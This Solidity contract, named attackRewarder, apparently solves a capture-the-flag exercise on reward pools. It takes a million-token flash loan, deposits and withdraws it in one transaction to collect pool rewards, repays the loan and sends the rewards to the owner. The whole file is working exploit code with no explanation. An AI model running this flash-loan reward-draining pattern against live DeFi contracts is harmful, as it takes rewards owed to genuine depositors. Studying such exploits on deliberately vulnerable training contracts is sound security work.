pragma solidity ^0.8.0;

interface IPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface ILoan {
    function flashLoan(uint256 amount) external;
}

interface IDVT {
    function transfer(address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external returns (bool);
}

interface IReward {
    function transfer(address to, uint256 amount) external;

    function balanceOf(address to) external returns (uint256);
}

contract attackRewarder {
    IPool pool;
    ILoan loan;
    IDVT token;
    IReward rToken;
    address owner;

    constructor(
        address _pool,
        address _loan,
        address _token,
        address _reward
    ) {
        pool = IPool(_pool);
        loan = ILoan(_loan);
        token = IDVT(_token);
        rToken = IReward(_reward);
        owner = msg.sender;
    }

    function attack() external {
        loan.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        token.transfer(address(loan), amount);

        uint256 rAmount = rToken.balanceOf(address(this));
        rToken.transfer(owner, rAmount);
    }

    fallback() external payable {}

    receive() external payable {}
}
